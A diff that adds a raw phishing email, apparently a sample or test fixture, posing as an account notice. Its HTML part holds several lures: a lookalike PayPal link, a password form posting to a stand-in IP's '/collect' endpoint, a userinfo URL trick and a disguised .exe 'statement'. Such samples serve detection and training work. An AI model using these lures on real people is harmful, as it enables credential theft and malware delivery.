@@ -1,0 +1,27 @@
+Return-Path: <notice@account-alerts.example>
+Authentication-Results: mx.google.com;
+       dkim=pass header.i=@account-alerts.example header.s=k1;
+       spf=pass smtp.mailfrom=notice@account-alerts.example;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=account-alerts.example
+From: Account Notice <notice@account-alerts.example>
+To: victim@example.org
+Subject: Action required: confirm your details
+Date: Sat, 14 Nov 2026 18:00:00 +0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="b2"
+
+--b2
+Content-Type: text/plain; charset=utf-8
+
+Confirm your details at https://bit.ly/3fakeId before your access expires.
+--b2
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<p>Your mailbox will be closed. <a href="https://paypa1-login.top/signin?u=1">https://www.paypal.com/signin</a></p>
+<p>Or sign in here:</p>
+<form action="http://198.51.100.23/collect"><input name="password" type="password"></form>
+<p><a href="https://www.paypal.com@login-check.example/verify">PayPal Account Center</a></p>
+<p><a href="https://files.example.net/Statement.pdf.exe">Statement.pdf</a></p>
+</body></html>
+--b2--
